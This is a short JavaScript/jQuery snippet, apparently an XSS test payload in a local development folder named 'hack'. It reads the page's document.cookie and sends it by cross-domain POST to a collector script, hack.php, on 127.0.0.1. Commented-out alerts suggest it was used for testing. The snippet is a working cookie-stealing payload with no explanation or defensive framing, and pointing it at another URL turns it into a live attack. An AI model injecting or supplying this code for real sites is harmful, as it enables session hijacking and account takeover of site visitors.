    //alert($('#test_hack').html());
    
    var x = document.cookie;
    $.ajax({
        method: "POST",
        crossDomain: true,
        url: "http://127.0.0.1/dev/jd/hack/hack.php",
        data: {_cookie: x}
    })
            .success(function () {
                //alert("Data Sent: " + msg);
            }).
                    error( function () {
                        //alert("Failed");
                    });
            